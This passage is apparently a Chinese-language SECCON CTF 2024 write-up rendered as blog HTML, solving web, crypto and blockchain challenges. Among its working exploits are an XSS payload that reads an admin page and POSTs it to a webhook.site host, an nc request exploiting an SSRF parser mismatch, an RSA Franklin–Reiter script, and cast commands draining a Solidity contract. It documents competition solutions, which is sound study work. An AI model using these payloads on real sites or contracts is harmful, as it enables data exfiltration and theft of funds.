class="number">1</span>):</span><br><span class="line">    transfer(creds[i], <span class="number">10</span>*<span class="number">2</span>**(<span class="number">39</span>-i))</span><br><span class="line"></span><br><span class="line">win()</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/r1NAtiKQyl.png" alt="image">  </p>
+<blockquote>
+<p>Flag: SECCON{The_Greedi3st_Hackers_in_th3_W0r1d:1,000,000,000,000}</p>
+</blockquote>
+<h3 id="Tanuki-Udon"><a href="#Tanuki-Udon" class="headerlink" title="Tanuki Udon"></a>Tanuki Udon</h3><p>一個markdown網頁，admin會在自己介面建立一個flag的文章  </p>
+<p><strong>markdown.js</strong>  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">escapeHtml</span> = (<span class="params">content</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> content</span><br><span class="line">    .<span class="title function_">replaceAll</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">replaceAll</span>(<span class="string">`&quot;`</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">replaceAll</span>(<span class="string">`&#x27;`</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">replaceAll</span>(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">    .<span class="title function_">replaceAll</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">markdown</span> = (<span class="params">content</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> escaped = escapeHtml(content);</span><br><span class="line">  <span class="keyword">return</span> escaped</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/!\[([^&quot;]*?)\]\(([^&quot;]*?)\)/g</span>, <span class="string">`&lt;img alt=&quot;$1&quot; src=&quot;$2&quot;&gt;&lt;/img&gt;`</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/\[(.*?)\]\(([^&quot;]*?)\)/g</span>, <span class="string">`&lt;a href=&quot;$2&quot;&gt;$1&lt;/a&gt;`</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/\*\*(.*?)\*\*/g</span>, <span class="string">`&lt;strong&gt;$1&lt;/strong&gt;`</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/  $/mg</span>, <span class="string">`&lt;br&gt;`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = markdown;</span><br></pre></td></tr></table></figure>
+
+<p>想要直接注入感覺是不可能了，但注意到它依序replace的行為：<br>構造<code>![[whale](meow)](test_url)</code>得到的會長這樣：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;&lt;a href=&quot;</span><span class="attr">test_url</span>&quot;&gt;</span>whale&quot; src=&quot;meow&quot;&gt;<span class="tag">&lt;/<span class="name">img</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>調用兩次replace就可以嵌入雙引號，test_url的地方幾乎是任意注入<br>受限於前面escapeHTML，我使用src, onerror的方法串payload，js的程式無法注入括號(會出問題，一樣跟replace行為有關)，<code>location=</code>，然後拿反引號取代引號…<br><strong>Generator</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;javascript:fetch(&#x27;/&#x27;).then(r=&gt;r.text()).then(r=&gt;fetch(&#x27;https://webhook.site/f4ea2c93-700e-4ec6-b459-a54cbe543b7d&#x27;, &#123;method: &#x27;POST&#x27;, body:r&#125;))&quot;</span></span><br><span class="line">payload=payload.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;\\x28&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;\\x29&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\x27&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;\\x3e&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+<p>生payload的腳本，有些字元要用<code>\x27</code>之類的hex換掉<br><img src="https://hackmd.io/_uploads/B1XdhotQ1l.png" alt="image"><br>拿到後開心跳flag<br><img src="https://hackmd.io/_uploads/BkyY3iKQkx.png" alt="image">  </p>
+<blockquote>
+<p>Flag: SECCON{Firefox Link &#x3D; Kitsune Udon &lt;-&gt; Chrome Speculation-Rules &#x3D; Tanuki Udon}</p>
+</blockquote>
+<p>P.S.聽說是unintended，之後再來想spec rule的跳法  </p>
+<h3 id="self-ssrf"><a href="#self-ssrf" class="headerlink" title="self-ssrf"></a>self-ssrf</h3><p>開個free SSRF，但有限制一些內容，<code>app.use</code>開了個全局規則  </p>
+<p><strong>Source Code</strong>  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LOCALHOST</span> = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">`http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = <span class="title class_">Bun</span>.<span class="property">env</span>.<span class="property">FLAG</span>!!;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">flag</span> === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> path = <span class="string">&quot;/flag?flag=guess_the_flag&quot;</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`Go to &lt;a href=&quot;<span class="subst">$&#123;path&#125;</span>&quot;&gt;<span class="subst">$&#123;path&#125;</span>&lt;/a&gt;`</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(</span><br><span class="line">    req.<span class="property">query</span>.<span class="property">flag</span> === <span class="variable constant_">FLAG</span> <span class="comment">// Guess the flag</span></span><br><span class="line">      ? <span class="string">`Congratz! The flag is &#x27;<span class="subst">$&#123;FLAG&#125;</span>&#x27;.`</span></span><br><span class="line">      : <span class="string">`&lt;marquee&gt;🚩🚩🚩&lt;/marquee&gt;`</span></span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/ssrf&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>, <span class="variable constant_">LOCALHOST</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">hostname</span> !== <span class="variable constant_">LOCALHOST</span>.<span class="property">hostname</span>) &#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Try harder 1&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">protocol</span> !== <span class="variable constant_">LOCALHOST</span>.<span class="property">protocol</span>) &#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Try harder 2&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url.<span class="property">pathname</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    url.<span class="property">searchParams</span>.<span class="title function_">append</span>(<span class="string">&quot;flag&quot;</span>, <span class="variable constant_">FLAG</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="keyword">await</span> <span class="title function_">fetch</span>(url).<span class="title function_">then</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> r.<span class="title function_">text</span>()));</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>);</span><br></pre></td></tr></table></figure>
+<p>攻擊手法是利用預設的URL不吃<code>MEOW[a]=1&amp;MEOW[b]=2</code>的query寫法，但express代的req.query是用querystring(qs)庫，他會吃的不一致性使得express認為有flag參數(才能過<code>/</code>的全局規則)，但url會去新增一個真正的flag參數。  </p>
+<p><strong>References:</strong>  </p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/main/doc/api/url.md#new-urlsearchparamsobj">https://github.com/nodejs/node/blob/main/doc/api/url.md#new-urlsearchparamsobj</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/main/doc/api/querystring.md#querystringstringifyobj-sep-eq-options">https://github.com/nodejs/node/blob/main/doc/api/querystring.md#querystringstringifyobj-sep-eq-options</a></li>
+</ol>
+<p>想想看，如果用<code>?flag[=]=</code>，在URL parse的時候會吃到<code>&#39;flag[&#39;</code>是<code>&#39;]=&#39;</code>，可是qs庫會認定是<code>flag[=]</code>值為空，最後接上&amp;flag&#x3D;&lt;真的flag&gt;就可以真的拿到flagㄌ  </p>
+<p><img src="https://hackmd.io/_uploads/HJktmx57Jg.png" alt="image"><br>像這樣，searchParams傳出去會把他url encode  </p>
+<p>最後就直接以nc建連線，GET下去SSRF<br><strong>Payload</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;GET http://localhost:3000/ssrf?flag[=]= HTTP/1.1\r\nHost: localhost\r\n\r\n&#x27;</span> | nc self-ssrf.seccon.games 3000</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/ryNrbnK71g.png" alt="image">  </p>
+<blockquote>
+<p>FLAG: SECCON{Which_whit3space_did_you_u5e?}</p>
+</blockquote>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>有點累所以只看一個數學題，其他Crypto之後會看💤  </p>
+<h3 id="reiwa-rot13"><a href="#reiwa-rot13" class="headerlink" title="reiwa_rot13"></a>reiwa_rot13</h3><p><strong>Source Code</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">137</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_lowercase, <span class="number">10</span>))</span><br><span class="line">rot13_key = codecs.encode(key, <span class="string">&#x27;rot13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = key.encode()</span><br><span class="line">rot13_key = rot13_key.encode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>, <span class="built_in">pow</span>(bytes_to_long(key), e, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>, <span class="built_in">pow</span>(bytes_to_long(rot13_key), e, n))</span><br><span class="line"></span><br><span class="line">key = hashlib.sha256(key).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;encyprted_flag = &quot;</span>, cipher.encrypt(flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注意到rot13的轉換可以當作某種線性變換，就變成已知明文加密及線性後的明文加密，可以進行<a href="https://wha13.github.io/2024/02/25/coppersmith/#Franklin%E2%80%93Reiter-Attack">Franklin–Reiter Attack(link)</a>  </p>
+<p><strong>Exploit</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">n = <span class="number">105270965659728963158005445847489568338624133794432049687688451306125971661031124713900002127418051522303660944175125387034394970179832138699578691141567745433869339567075081508781037210053642143165403433797282755555668756795483577896703080883972479419729546081868838801222887486792028810888791562604036658927</span></span><br><span class="line">e = <span class="number">137</span></span><br><span class="line">c1 = <span class="number">16725879353360743225730316963034204726319861040005120594887234855326369831320755783193769090051590949825166249781272646922803585636193915974651774390260491016720214140633640783231543045598365485211028668510203305809438787364463227009966174262553328694926283315238194084123468757122106412580182773221207234679</span></span><br><span class="line">c2 = <span class="number">54707765286024193032187360617061494734604811486186903189763791054142827180860557148652470696909890077875431762633703093692649645204708548602818564932535214931099060428833400560189627416590019522535730804324469881327808667775412214400027813470331712844449900828912439270590227229668374597433444897899112329233</span></span><br><span class="line">encyprted_flag =  <span class="string">b&quot;\xdb&#x27;\x0bL\x0f\xca\x16\xf5\x17&gt;\xad\xfc\xe2\x10$(DVsDS~\xd3v\xe2\x86T\xb1&#123;xL\xe53s\x90\x14\xfd\xe7\xdb\xddf\x1fx\xa3\xfc3\xcb\xb5~\x01\x9c\x91w\xa6\x03\x80&amp;\xdb\x19xu\xedh\xe4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, a, b, e, n</span>):</span><br><span class="line">    P = PolynomialRing(Zmod(n), names=(<span class="string">&#x27;x&#x27;</span>,)); (x,) = P._first_ngens(<span class="number">1</span>)</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (a*x+b)^e - c2</span><br><span class="line">    g2 = g2.monic()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">key</span>):</span><br><span class="line">    key = hashlib.sha256(key).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="built_in">print</span>(cipher.decrypt(encyprted_flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    cur=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">10</span>, <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">        cur*=<span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> b==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            cur+=<span class="number">13</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur-=<span class="number">13</span></span><br><span class="line">    res=attack(c1, c2, <span class="number">1</span>, cur, e, n)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(long_to_bytes(<span class="built_in">int</span>(res)))==<span class="number">10</span>:</span><br><span class="line">        key=long_to_bytes(<span class="built_in">int</span>(res))</span><br><span class="line">        decrypt(key)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: SECCON{Vim_has_a_command_to_do_rot13._g?_is_possible_to_do_so!!}</p>
+</blockquote>
+<h2 id="blockchain"><a href="#blockchain" class="headerlink" title="blockchain"></a>blockchain</h2><h3 id="Trillion-Ether"><a href="#Trillion-Ether" class="headerlink" title="Trillion Ether"></a>Trillion Ether</h3><p>任務是把合約所有錢領走  </p>
+<p><strong>TrillionEther.sol</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.28;</span><br><span class="line"></span><br><span class="line">contract TrillionEther &#123;</span><br><span class="line">    struct Wallet &#123;</span><br><span class="line">        bytes32 name;</span><br><span class="line">        uint256 balance;</span><br><span class="line">        address owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Wallet[] public wallets;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value == 1_000_000_000_000 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createWallet(bytes32 name) external payable &#123;</span><br><span class="line">        wallets.push(_newWallet(name, msg.value, msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(uint256 fromWalletId, uint256 toWalletId, uint256 amount) external &#123;</span><br><span class="line">        require(wallets[fromWalletId].owner == msg.sender, &quot;not owner&quot;);</span><br><span class="line">        wallets[fromWalletId].balance -= amount;</span><br><span class="line">        wallets[toWalletId].balance += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 walletId, uint256 amount) external &#123;</span><br><span class="line">        require(wallets[walletId].owner == msg.sender, &quot;not owner&quot;);</span><br><span class="line">        wallets[walletId].balance -= amount;</span><br><span class="line">        payable(wallets[walletId].owner).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _newWallet(bytes32 name, uint256 balance, address owner) internal returns (Wallet storage wallet) &#123;</span><br><span class="line">        wallet = wallet;</span><br><span class="line">        wallet.name = name;</span><br><span class="line">        wallet.balance = balance;</span><br><span class="line">        wallet.owner = owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看得出來是一個Wallet的服務，有個wallets的動態陣列，主要的漏洞出在這一行(_newWallet)：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wallet = wallet;</span><br></pre></td></tr></table></figure>
+<p>這邊wallet尚未被定義，所以會變成一個空指針被冠上Wallet的struct，所以第一個name會寫到slot[0]，這也是紀錄wallets當前大小的地方<br>試一下會發現如果送出一個正常的name，再去看wallet[0]的值會發現沒東西，因為寫入時寫到wallet[name]的地方  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast call <span class="variable">$target</span> <span class="string">&quot;wallets(uint256)(bytes32,uint256,address)&quot;</span> 0 --rpc-url <span class="variable">$rpc_url</span></span><br></pre></td></tr></table></figure>
+<p>所以一開始name要送0x0出去，才能把內容正常化(owner屬性存在)<br>接下來就是interger overflow，送出<code>0x5555555555555555555555555555555555555555555555555555555555555555</code>做為第二次的name，這時候在slot上會嘗試往wallet_base+0x5…5*3 % (2^256)的地方寫入(因為slot大小極限&amp;這個struct算一下就會發現三個變數各佔一個slot)<br>而選擇0x5…5\是因為乘以3以後正好就是-1 % (2^256)，這時候就會從 wallet_base - 1開始寫，導致owner的值寫到剛剛wallet[0]的balance上，balance寫到它的name上，最終只需withdraw所有錢回來就好w<br><strong>Exploit</strong><br><del>這邊懶惰直接用foundry tool的cast殺下去</del>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cast send <span class="variable">$target</span> <span class="string">&quot;createWallet(bytes32)&quot;</span> 0x0000000000000000000000000000000000000000000000000000000000000000 --private-key <span class="variable">$secret</span> --rpc-url <span class="variable">$rpc_url</span></span><br><span class="line">cast send <span class="variable">$target</span> <span class="string">&quot;createWallet(bytes32)&quot;</span> 0x5555555555555555555555555555555555555555555555555555555555555555 --private-key <span class="variable">$secret</span> --rpc-url <span class="variable">$rpc_url</span></span><br><span class="line">cast send <span class="variable">$target</span> <span class="string">&quot;withdraw(uint256, uint256)&quot;</span> 0 1000000000000000000000000000000 --private-key <span class="variable">$secret</span> --rpc-url <span class="variable">$rpc_url</span></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trillion-Bank"><span class="toc-number">2.1.</span> <span class="toc-text">Trillion Bank</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tanuki-Udon"><span class="toc-number">2.2.</span> <span class="toc-text">Tanuki Udon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#self-ssrf"><span class="toc-number">2.3.</span> <span class="toc-text">self-ssrf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reiwa-rot13"><span class="toc-number">3.1.</span> <span class="toc-text">reiwa_rot13</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blockchain"><span class="toc-number">4.</span> <span class="toc-text">blockchain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trillion-Ether"><span class="toc-number">4.1.</span> <span class="toc-text">Trillion Ether</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/12/01/seccon-ctf-2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&text=SECCON CTF 2024 紀錄"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&is_video=false&description=SECCON CTF 2024 紀錄"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SECCON CTF 2024 紀錄&body=Check out this article: http://wha13.github.io/2024/12/01/seccon-ctf-2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/12/01/seccon-ctf-2024/&title=SECCON CTF 2024 紀錄"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
